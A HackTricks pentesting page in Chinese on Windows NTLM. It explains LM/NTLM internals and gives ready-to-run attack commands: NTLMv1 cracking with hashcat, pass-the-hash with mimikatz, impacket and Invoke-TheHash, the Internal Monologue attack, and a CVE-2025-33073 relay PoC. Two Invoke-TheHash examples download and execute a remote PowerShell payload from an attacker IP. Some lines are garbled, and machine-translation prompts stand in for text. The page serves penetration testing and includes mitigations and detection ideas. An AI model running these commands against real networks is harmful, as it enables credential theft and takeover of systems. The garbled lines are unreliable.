# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本信息

在运行 **Windows XP 和 Server 2003** 的环境中，会使用 LM (Lan Manager) hashes，尽管众所周知这些 hashes 很容易被破解。特定的 LM hash `AAD3B435B51404EEAAD3B435B51404EE` 表示未使用 LM，因为它代表空字符串的 hash。

默认情况下，**Kerberos** authentication protocol 是主要使用的方法。在以下特定情况下会使用 NTLM (NT LAN Manager)：不存在 Active Directory、域不存在、由于配置不当导致 Kerberos malfunction，或者尝试使用 IP address 而不是有效的 hostname 建立连接时。

网络数据包中出现 **"NTLMSSP"** header 表示正在进行 NTLM authentication process。

对 authentication protocols - LM、NTLMv1 和 NTLMv2 的支持由位于 `%windir%\Windows\System32\msv1\_0.dll` 的特定 DLL 提供。

**要点**：

- LM hashes 存在 vulnerability，空 LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) 表示未使用 LM。
- Kerberos 是默认的 authentication method，只有在特定条件下才会使用 NTLM。
- NTLM authentication packets 可通过 "NTLMSSP" header 识别。
- LM、NTLMv1 和 NTLMv2 protocols 由 system file `msv1\_0.dll` 支持。

## LM、NTLMv1 和 NTLMv2

你可以检查并配置将使用的 protocol：

### GUI

执行 _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level。共有 6 个 levels（从 0 到 5）。

![LM、NTLMv1 和 NTLMv2 - GUI：执行 secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level。共有 6 个 levels（从 0 到 5）](<../../images/image (919).png>)

### Registry

这将设置 level 5：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能的值：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM 域 authentication Scheme

1. **user** 输入其**credentials**
2. 客户端机器发送**authentication request**，发送**domain name**和**username**
3. **server** 发送 **challenge**
4. **client** 使用 password 的 hash 作为密钥对 **challenge** 进行**加密**，并将其作为 response 发送
5. **server** 将 **domain name、username、challenge 和 response** 发送给 **Domain controller**。如果没有配置 **Active Directory**，或者 domain name 是 server 的名称，则会在本地**检查 credentials**。
6. **domain controller** 检查所有内容是否正确，并将信息发送给 server

**server** 和 **Domain Controller** 能够通过 **Netlogon** server 创建 **Secure Channel**，因为 Domain Controller 知道 server 的 password（它位于 **NTDS.DIT** db 中）。

### Local NTLM authentication Scheme

该 authentication 与上面提到的相同，**但** **server** 知道尝试进行 authentication 的 **user** 的 **hash**，该 hash 位于 **SAM** 文件中。因此，server 不会向 Domain Controller 发起请求，而是由 **server 自身检查**该 user 是否可以进行 authentication。

### NTLMv1 Challenge

**challenge length 为 8 bytes**，**response length 为 24 bytes**。

**NT hash（16bytes）** 被分为 **3 个部分，每部分 7bytes**（7B + 7B + (2B+0x00\*5)）：**最后一部分始终用 zeros 填充**。然后，使用每个部分分别对 **challenge** 进行 **cipher**，并将得到的 ciphered bytes **连接**起来。总计：8B + 8B + 8B = 24Bytes。

**Problems**：

- 缺乏 **randomness**
- 这 3 个部分可以被**分别攻击**，以找到 NT hash
- **DES 可以被 crack**
- 第 3 个 key 始终由 **5 个 zeros** 组成。
- 给定**相同的 challenge**，**response** 将会相同。因此，你可以将字符串 "**1122334455667788**" 作为 **challenge** 发送给受害者，并使用预先计算的 **rainbow tables** 攻击其 response。

### NTLMv1 attack

如今，发现配置了 Unconstrained Delegation 的环境正变得越来越少见，但这并不意味着你不能**滥用**已配置的 **Print Spooler service**。

你可以滥用在 AD 上已有的某些 credentials/sessions，**要求 printer 向你控制的某个 host 进行 authentication**。然后，使用 `metasploit auxiliary/server/capture/smb` 或 `responder`，你可以将 authentication challenge **设置为 1122334455667788**，捕获 authentication attempt；如果使用的是 **NTLMv1**，你就能够将其 **crack**。\
如果你使用 `responder`，可以尝试使用 **flag `--lm`** 来尝试**降级** **authentication**。\
_注意，对于此 technique，authentication 必须使用 NTLMv1 执行（NTLMv2 无效）。_

请记住，printer 在 authentication 期间会使用 computer account，而 computer accounts 使用**很长且随机的 passwords**，你**可能无法**使用常见的 **dictionaries** 将其 crack。但 **NTLMv1** authentication **使用 DES**（[more info here](#ntlmv1-challenge)），因此使用专门用于 cracking DES 的某些 services，你将能够将其 crack（例如可以使用 [https://crack.sh/](https://crack.sh) 或 [https://ntlmv1.com/](https://ntlmv1.com)）。

### NTLMv1 attack with hashcat

NTLMv1 也可以使用 NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) 破解。该工具会以一种可使用 hashcat 破解的方法格式化 NTLMv1 messages。<sup>[[1]](#references)</sup>

该命令
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
请提供需要翻译的 Markdown 内容。
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the file contents to be included.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
运行 hashcat（最好通过 hashtopolis 之类的工具进行分布式处理），否则这将需要数天时间。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
在本例中，我们知道其密码是 password，因此为了演示目的，我们将作弊：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
现在需要使用 hashcat-utilities 将已破解的 DES 密钥转换为 NTLM hash 的组成部分：
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Please provide the last part of the text to translate.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the English text you want me to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length is 8 bytes**，并且会发送 **2 个 responses**：其中一个长度为 **24 bytes**，另一个的长度**可变**。

**第一个 response** 的生成方式是：使用 **HMAC_MD5** 对由 **client 和 domain** 组成的**字符串**进行加密，并使用 **NT hash** 的 **MD4 hash** 作为 **key**。然后，将**结果**作为 **key**，使用 **HMAC_MD5** 对 **challenge** 进行加密。最后加入一个 **8 bytes** 的 **client challenge**。总长度：24 B。

**第二个 response** 使用**多个值**生成，包括一个新的 client challenge、用于避免 **replay attacks** 的 **timestamp** 等。

如果你有一个捕获了成功 authentication process 的 **pcap**，可以按照本指南获取 domain、username、challenge 和 response，然后尝试破解 password：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**获取 victim 的 hash 后**，你可以使用它来**冒充 victim**。\
你需要使用一个能够**使用该 hash 执行 NTLM authentication 的 tool**，或者创建一个新的 **sessionlogon**，并将该 **hash 注入** **LSASS**，这样每当执行 **NTLM authentication** 时，都会使用该 **hash**。后一种方式就是 mimikatz 的工作原理。

**请记住，也可以使用 Computer accounts 执行 Pass-the-Hash attacks。**

### **Mimikatz**

**需要以 administrator 身份运行**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
这将启动一个进程，该进程属于启动 mimikatz 的用户，但在 LSASS 内部，保存的凭据是 mimikatz 参数中的凭据。随后，你可以像该用户一样访问 network 资源（类似于 `runas /netonly` 技巧，但不需要知道明文密码）。

### 从 Linux 执行 Pass-the-Hash

你可以使用 Linux 上的 Pass-the-Hash 在 Windows 机器中获得代码执行权限。\
[**访问此处了解具体操作。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows 编译工具

你可以[在此处下载 Windows 版 impacket binaries](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（在此情况下，你需要指定一个命令，cmd.exe 和 powershell.exe 不能用于获取交互式 shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacket binaries 还有很多……

### Invoke-TheHash

你可以从此处获取 powershell scripts：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

此函数是**其他所有函数的组合**。你可以传入**多个主机**、**排除**某些主机，并**选择**要使用的**选项**（_SMBExec、WMIExec、SMBClient、SMBEnum_）。如果你选择了 **SMBExec** 或 **WMIExec**，但没有提供任何 _**Command**_ 参数，它只会**检查**你是否拥有**足够的权限**。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**需要以管理员身份运行**

此工具会执行与 mimikatz 相同的操作（修改 LSASS 内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 使用用户名和密码进行 Windows 远程执行


{{#ref}}
../lateral-movement/
{{#endref}}

## 从 Windows Host 提取 credentials

**有关** [**如何从 Windows host 获取 credentials 的更多信息，请阅读此页面**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## Internal Monologue attack

Internal Monologue Attack 是一种隐蔽的 credential extraction 技术，允许攻击者从受害者机器中获取 NTLM hashes，**而无需直接与 LSASS 进程交互**。不同于直接从内存读取 hashes、并且经常被 endpoint security solutions 或 Credential Guard 拦截的 Mimikatz，此攻击通过 **经由 Security Support Provider Interface (SSPI) 对 NTLM authentication package (MSV1_0) 进行本地调用**来实现。攻击者首先**降低 NTLM 设置**（例如 LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic），确保允许使用 NetNTLMv1。随后，他们冒充从运行中进程获取的现有 user tokens，并在本地触发 NTLM authentication，使用已知 challenge 生成 NetNTLMv1 responses。<sup>[[4]](#references)</sup>

捕获这些 NetNTLMv1 responses 后，攻击者可以使用**预计算的 rainbow tables**快速恢复原始 NTLM hashes，从而进一步通过 Pass-the-Hash attacks 实现 lateral movement。关键在于，Internal Monologue Attack 不会产生 network traffic、注入 code 或触发直接 memory dumps，因此保持了隐蔽性；与 Mimikatz 等传统方法相比，防御者更难检测到它。

如果由于强制执行的 security policies 而不接受 NetNTLMv1，攻击者可能无法获取 NetNTLMv1 response。

为处理这种情况，Internal Monologue tool 已进行更新：如果 NetNTLMv1 失败，它会使用 `AcceptSecurityContext()` 动态获取 server token，仍然**捕获 NetNTLMv2 responses**。虽然 NetNTLMv2 更难 crack，但在有限情况下，它仍然为 relay attacks 或 offline brute-force 提供了途径。

PoC 可在 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** 中找到。<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**有关如何执行这些 attacks 的详细指南，请参阅此处：**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 从 network capture 中解析 NTLM challenges

**你可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows 包含多种 mitigation，用于防止 *reflection* attacks：来自某个 host 的 NTLM（或 Kerberos）authentication 被 relay 回**同一** host，从而获取 SYSTEM privileges。

Microsoft 通过 MS08-068 (SMB→SMB)、MS09-013 (HTTP→SMB)、MS15-076 (DCOM→DCOM) 及后续 patches 修复了大多数公开 chains；然而，**CVE-2025-33073** 表明，攻击者仍可通过滥用 **SMB client 对包含 *marshalled*（serialized）target-info 的 Service Principal Names (SPNs) 进行截断的行为**来绕过这些 protections。<sup>[[5]](#references)[[6]](#references)</sup>

### Bug TL;DR
1. 攻击者注册一个 **DNS A-record**，其 label 编码了一个 marshalled SPN，例如：
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 诱导 victim 向该 hostname 进行 authentication（PetitPotam、DFSCoerce 等）。
3. 当 SMB client 将 target string `cifs/srv11UWhRCAAAAA…` 传递给 `lsasrv!LsapCheckMarshalledTargetInfo` 时，对 `CredUnmarshalTargetInfo` 的调用会**移除** serialized blob，只留下 **`cifs/srv1`**。
4. `msv1_0!SspIsTargetLocalhost`（或对应的 Kerberos 函数）现在会将该 target 视为 *localhost*，因为短 host 部分与 computer name (`SRV1`) 匹配。
5. 因此，server 设置 `NTLMSSP_NEGOTIATE_LOCAL_CALL`，并将 **LSASS 的 SYSTEM access-token** 注入 context（对于 Kerberos，则会创建一个标记为 SYSTEM 的 subsession key）。
6. 使用 `ntlmrelayx.py` **或** `krbrelayx.py` relay 该 authentication，即可在同一 host 上获得完整的 SYSTEM rights。<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* 针对 **CVE-2025-33073** 的 KB patch 在 `mrxsmb.sys::SmbCeCreateSrvCall` 中加入检查：如果目标包含 marshalled info（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`），则阻止该 SMB connection。<sup>[[5]](#references)[[6]](#references)</sup>
* 强制启用 **SMB signing**，即使在未打 patch 的主机上也能防止 reflection。
* 监控类似 `*<base64>...*` 的 DNS records，并阻止 coercion vectors（PetitPotam、DFSCoerce、AuthIP...）。

### Detection ideas
* 捕获包含 `NTLMSSP_NEGOTIATE_LOCAL_CALL` 的 network traffic，且 client IP ≠ server IP。
* Kerberos AP-REQ 包含 subsession key，且 client principal 等于 hostname。
* Windows Event 4624/4648 SYSTEM logon 后，紧接着出现来自同一主机的 remote SMB writes。<sup>[[5]](#references)</sup>

对于 **March 2026** 利用 **SMB arbitrary ports** 和 **TCP connection reuse** 获取 `NT AUTHORITY\SYSTEM` 权限的 local reflection variant，请参见：

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
